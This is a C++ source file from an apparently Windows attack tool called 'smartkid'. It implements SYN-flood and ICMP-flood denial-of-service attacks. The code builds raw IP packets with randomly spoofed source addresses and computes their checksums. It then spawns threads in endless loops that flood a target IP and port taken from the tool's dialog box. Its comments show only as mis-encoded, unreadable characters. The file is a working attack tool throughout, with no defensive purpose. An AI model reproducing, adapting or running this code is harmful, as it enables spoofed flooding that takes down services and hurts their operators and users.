#include "StdAfx.h"
#include "socksupport.h"
#include "ddos.h"
#include "smartkidDlg.h"

CDdos::CDdos(void)
{
}

CDdos::~CDdos(void)
{
}

CCriticalSection CDdos::m_Sync;
link_type	CDdos::m_ddostype;
u_short 	CDdos::m_ncounter=0;
u_short 	CDdos::m_threadnum=0;
u_short		CDdos::m_listCounter=0;
u_long		CDdos::m_source_ip=0;
char		CDdos::m_target_ip[16]={0};
u_short		CDdos::m_target_port;
u_short		CDdos::m_source_port;
u_long	    CDdos::m_seq_num;

volatile SOCKET			 CDdos::sock;
volatile SOCKADDR_IN	 CDdos::syn_in; 
volatile SOCKADDR_IN	 CDdos::icmp_in; 

volatile IP_HEADER	 CDdos::ipheader;  
volatile TCP_HEADER	 CDdos::tcpheader;  
volatile PSD_HEADER	 CDdos::psdheader;
volatile ICMP_HEADER CDdos::icmpheader; 

CsmartkidDlg* CDdos::m_pDlg=0;

void CDdos::InitSynPacket()
{
	//���Ŀ�����
	memset((void *)&syn_in,0,sizeof(syn_in));
	syn_in.sin_family = AF_INET;  
	syn_in.sin_addr.s_addr = inet_addr(m_target_ip); 
	syn_in.sin_port = htons(m_target_port);  

	//�������ԴIP��ַ���жϣ�ֻȡB���C��IP��ַ 
	const int randnum=2006;

	m_source_ip=htonl(MakeRand32(randnum));

	while(((m_source_ip & 0xe0000000) == 0xe0000000) || (m_source_ip < 0x80000000)) 
	{ 
		m_source_ip = htonl(MakeRand32(randnum)); 
	} 
	m_seq_num = MakeRand32(randnum); 
	m_source_port = MakeRand16(randnum); 

	//���IP�ײ� 
	memset((void *)&ipheader,0,sizeof(ipheader));
	ipheader.h_verlen=(4<<4 | sizeof(IP_HEADER)/sizeof(unsigned long));  
	ipheader.tos=0;  
	ipheader.total_len=htons(sizeof(IP_HEADER)+sizeof(TCP_HEADER));  
	ipheader.ident=1;  
	ipheader.frag_and_flags=0x40;  
	ipheader.ttl=255;	//��� 
	ipheader.proto=IPPROTO_TCP;  
	ipheader.checksum=0;  
	ipheader.sourceIP=m_source_ip;
	ipheader.destIP=inet_addr(m_target_ip);  

	//���Tcp�ײ�  
	memset((void *)&tcpheader,0,sizeof(tcpheader));
	tcpheader.th_dport=htons(m_target_port);  
	tcpheader.th_sport=htons(m_source_port);  
	tcpheader.th_seq=htonl(m_seq_num);  
	tcpheader.th_ack=0;  
	tcpheader.th_lenres=(sizeof(TCP_HEADER)/4<<4|0);  
	tcpheader.th_flag=2;  //syn 00000010 �޸�������ʵ�ֲ�ͬ�ı�־λ̽�⣬2��SYN��1��FIN��16��ACK̽�� 
	tcpheader.th_win=htons(512);  
	tcpheader.th_urp=0;  
	tcpheader.th_sum=0;  

	//���TCPα�ײ���������TCPͷ����Ч��� 
	memset((void *)&psdheader,0,sizeof(psdheader));
	psdheader.saddr=ipheader.sourceIP;  
	psdheader.daddr=ipheader.destIP;  
	psdheader.mbz=0;  
	psdheader.ptcl=IPPROTO_TCP;  
	psdheader.tcpl=htons(sizeof(TCP_HEADER)); 
}


void CDdos::InitIcmpPacket()
{
	//���Ŀ�����
	memset((void *)&icmp_in,0,sizeof(icmp_in));
	icmp_in.sin_family = AF_INET;  
	icmp_in.sin_addr.s_addr = inet_addr(m_target_ip); 
	icmp_in.sin_port = htons(m_target_port);  

	//�������ԴIP��ַ���жϣ�ֻȡB���C��IP��ַ 
	const int randnum=2006;

	m_source_ip=htonl(MakeRand32(randnum));

	while(((m_source_ip & 0xe0000000) == 0xe0000000) || (m_source_ip < 0x80000000)) 
	{ 
		m_source_ip = htonl(MakeRand32(randnum)); 
	} 
	m_seq_num = MakeRand32(randnum); 
	m_source_port = MakeRand16(randnum); 

	//���IP�ײ�  
	memset((void *)&ipheader,0,sizeof(ipheader));
	ipheader.h_verlen=(4<<4 | sizeof(IP_HEADER)/sizeof(unsigned long));  
	ipheader.tos=0;  
	ipheader.total_len=htons(sizeof(IP_HEADER)+sizeof(ICMP_HEADER));  
	ipheader.ident=1;  
	ipheader.frag_and_flags=0x40;  
	ipheader.ttl=255;	//��� 
	ipheader.proto=IPPROTO_ICMP;  
	ipheader.checksum=0;  
	ipheader.sourceIP=m_source_ip;
	ipheader.destIP=inet_addr(m_target_ip);  

	//���ICMP�ײ�
	memset((void *)&icmpheader,0,sizeof(icmpheader));
	icmpheader.ih_type=8;
	icmpheader.ih_code=0;
	icmpheader.ih_cksum=0;
	icmpheader.ih_id=(USHORT)GetCurrentProcessId();
	icmpheader.ih_seq=htons(u_short(m_seq_num));
	icmpheader.ih_timestamp=htonl(GetTickCount());
}

UINT CDdos::syn_ddosthread(LPVOID param)
{
	m_Sync.Lock();
	m_ncounter++;	
	m_Sync.Unlock();

	//����ʱѭ���ڵĴ�����Ҫ�ǽ���У��ͼ����뻺���������
	static int randnum=0;

	if(randnum==2006)
	{
		randnum=0;
	}
	else
	{
		++randnum;
	}
	//�������ԴIP��ַ���жϣ�ֻȡB���C��IP��ַ 
	m_source_ip = htonl(MakeRand32(randnum)); 
	while(((m_source_ip & 0xe0000000) == 0xe0000000) || (m_source_ip < 0x80000000)) 
	{
		m_source_ip = htonl(MakeRand32(randnum)); 
	} 
	m_seq_num = MakeRand32(randnum); 
	m_source_port = MakeRand16(randnum); 

	ipheader.checksum =0;	//������0
	ipheader.sourceIP = m_source_ip;
	tcpheader.th_seq = htonl(m_seq_num);
	tcpheader.th_sport = htons(m_source_port);
	tcpheader.th_sum = 0;	//������0
	psdheader.saddr=ipheader.sourceIP;

	//����У���  
	char SendBuff[256]={0};  

	//����TCPУ��� 
	memcpy(SendBuff, (void*)&psdheader, sizeof(PSD_HEADER));  
	memcpy(SendBuff+sizeof(PSD_HEADER), (void*)&tcpheader, sizeof(TCP_HEADER));  
	tcpheader.th_sum=checksum((u_short *)SendBuff,sizeof(PSD_HEADER)+sizeof(TCP_HEADER)); 

	//����IP�����
	memcpy(SendBuff,(void*) &ipheader, sizeof(IP_HEADER));  
	memcpy(SendBuff+sizeof(IP_HEADER), (void*)&tcpheader, sizeof(TCP_HEADER));  
	memset(SendBuff+sizeof(IP_HEADER)+sizeof(TCP_HEADER),0,4);
	ipheader.checksum=checksum((u_short *)SendBuff,sizeof(IP_HEADER));
	memcpy(SendBuff,(void*) &ipheader, sizeof(IP_HEADER)); 

	//sock = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
	sock=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED);
	if(sock ==INVALID_SOCKET)
	{  
		PrintError("WSASocket");
	}

	BOOL flag=true;  
	int ret=setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char*)&flag,sizeof(flag));
	if(ret==SOCKET_ERROR)
	{
		closesocket(sock);
		PrintError("setsockopt");
	}

	int nTimeOut =2000;//2s  
	ret=setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,(char*)&nTimeOut,sizeof(nTimeOut)); 
	if(ret==SOCKET_ERROR)
	{
		closesocket(sock);
		PrintError("setsockopt");
	}
	//�������ݰ�  
	ret=sendto(sock, SendBuff, sizeof(IP_HEADER)+sizeof(TCP_HEADER), 0, (struct sockaddr*)&syn_in, sizeof(syn_in));  
	if(ret==SOCKET_ERROR)  
	{  
		closesocket(sock);
		PrintError("sendto");
	}  
	closesocket(sock);

	return 0;  
}

UINT CDdos::icmp_ddosthread(LPVOID param)
{
	m_Sync.Lock();
	m_ncounter++;	
	m_Sync.Unlock();
	//����ʱѭ���ڵĴ�����Ҫ�ǽ���У��ͼ����뻺���������
	static int randnum=0;

	if(randnum==2006)
	{
		randnum=0;
	}
	else
	{
		++randnum;
	}
	//�������ԴIP��ַ���жϣ�ֻȡB���C��IP��ַ 
	m_source_ip = htonl(MakeRand32(randnum)); 
	while(((m_source_ip & 0xe0000000) == 0xe0000000) || (m_source_ip < 0x80000000)) 
	{ 
		m_source_ip = htonl(MakeRand32(randnum)); 
	} 
	m_seq_num = MakeRand32(randnum); 
	m_source_port = MakeRand16(randnum); 

	ipheader.checksum =0;	//������0
	ipheader.ident = rand();
	ipheader.sourceIP = m_source_ip;

	icmpheader.ih_cksum=0;
	icmpheader.ih_id=(USHORT)GetCurrentProcessId();
	icmpheader.ih_seq=htons(u_short(m_seq_num));
	icmpheader.ih_timestamp=htonl(GetTickCount());

	//����ICMPУ��� 
	icmpheader.ih_cksum=checksum((u_short *)&icmpheader,sizeof(ICMP_HEADER));

	char SendBuff[128]={0};  
	//����IP�����
	memcpy(SendBuff, (void*)&ipheader, sizeof(IP_HEADER));  
	memcpy(SendBuff+sizeof(IP_HEADER),(void*) &icmpheader, sizeof(ICMP_HEADER));  
	ipheader.checksum=checksum((u_short *)SendBuff,sizeof(IP_HEADER));
	memcpy(SendBuff, (void*)&ipheader, sizeof(IP_HEADER)); 

	sock=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED);
	if(sock ==INVALID_SOCKET)
	{  
		PrintError("WSASocket");
	}

	BOOL flag=true;  
	int ret=setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char*)&flag,sizeof(flag));
	if(ret==SOCKET_ERROR)
	{
		closesocket(sock);
		PrintError("setsockopt");
	}

	int nTimeOut =2000;//2s  
	ret=setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,(char*)&nTimeOut,sizeof(nTimeOut)); 
	if(ret==SOCKET_ERROR)
	{
		closesocket(sock);
		PrintError("setsockopt");
	}

	//�������ݰ�  
	ret=sendto(sock, SendBuff, sizeof(IP_HEADER)+sizeof(ICMP_HEADER), 0, (struct sockaddr*)&icmp_in, sizeof(icmp_in));  
	if(ret==SOCKET_ERROR)  
	{  
		closesocket(sock);
		PrintError("sendto");
	}  

	closesocket(sock);
	return 0;  
}

void CDdos::start_ddos()
{
	m_listCounter=0;
	m_ncounter=0;
	m_pDlg=(CsmartkidDlg*)AfxGetApp()->GetMainWnd();
	m_threadnum=m_pDlg->m_threadnum;
	m_ddostype=m_pDlg->m_ddostype;
	strcpy(m_target_ip,m_pDlg->m_targetip.GetBuffer());
	m_target_port=m_pDlg->m_ddosport;

	switch(m_ddostype) 
	{
	case _SYN:
		{
			//��ʼ��ʼ�����ݰ� 
			InitSynPacket(); 
			break;
		}
	case _ICMP:
		{
			//��ʼ��ʼ�����ݰ� 
			InitIcmpPacket(); 
			break;
		}
	}
	m_pDlg->m_prog->SetRange(0,m_threadnum);
	m_pDlg->m_prog->SetStep(1);
	AfxBeginThread(ddosthread,NULL);
}

UINT CDdos::ddosthread(LPVOID param)
{
	CWinThread *wt[1024];
	HANDLE hThread[1024];
	u_short nThreadCounter;

	//�������Ͱ��߳�
	switch(m_ddostype) 
	{
	case _SYN:
		{
			while(1)
			{
				nThreadCounter=0;
				//ÿ�������������߳�ʵ�ʸ���,���һ����һ������ֵ
				for(int j=0;j<m_threadnum;j++)
				{
					if(g_stop==true)
					{
						break;
					}
					//��ѭ������
					nThreadCounter++;
					m_pDlg->m_prog->StepIt();
					wt[j]=AfxBeginThread(syn_ddosthread,NULL);
					hThread[j]=wt[j]->m_hThread;
				}
				hThread[j]=NULL;//�ǳ���Ҫ,��Ϊ��ִ��if(m_ncounter>m_portnum-1)ʱ���жϵģ���ʱhThread[j]��ֵ
				//���k=0����ʾû�п����߳�
				if(j!=0)
				{
					WaitForMultipleObjects(nThreadCounter,hThread,TRUE,500);
				}
				m_pDlg->m_prog->SetPos(0);
			}
			break;
		}			
	case _ICMP:
		{			
			while(1)
			{
				nThreadCounter=0;
				//ÿ�������������߳�ʵ�ʸ���,���һ����һ������ֵ
				for(int j=0;j<m_threadnum;j++)
				{
					if(g_stop==true)
					{
						break;
					}
					//��ѭ������
					nThreadCounter++;
					m_pDlg->m_prog->StepIt();
					wt[j]=AfxBeginThread(icmp_ddosthread,NULL);
					hThread[j]=wt[j]->m_hThread;
				}
				hThread[j]=NULL;//�ǳ���Ҫ,��Ϊ��ִ��if(m_ncounter>m_portnum-1)ʱ���жϵģ���ʱhThread[j]��ֵ
				//���k=0����ʾû�п����߳�
				if(j!=0)
				{
					WaitForMultipleObjects(nThreadCounter,hThread,TRUE,500);
				}
				m_pDlg->m_prog->SetPos(0);
			}
			break;
		}
	}

	m_pDlg->m_prog->SetPos(0);
	return 0;
}